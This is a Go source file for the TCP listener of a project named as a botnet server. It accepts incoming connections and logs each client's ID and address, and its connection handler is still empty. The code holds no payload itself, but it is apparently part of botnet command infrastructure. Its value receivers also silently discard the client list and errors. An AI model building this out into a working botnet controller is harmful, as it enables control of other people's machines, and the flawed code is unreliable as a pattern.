package tcp

import (
	"net"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/botnet/server/service/domain"
)

// Service struct
type Service struct {
	listener net.Listener
	Clients  []*domain.Client
	Error    error
}

// NewTCPService create tcpService struct
func NewTCPService(port string) *Service {
	ln, err := net.Listen("tcp", port)

	return &Service{
		listener: ln,
		Error:    err,
	}
}

// Run wait for a connection
func (s Service) Run() {
	go s.acceptConnection()
}

func (s Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error = err
			continue
		}

		client := &domain.Client{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		s.Clients = append(s.Clients, client)
	}
}

func (s Service) handleConnection() {

}
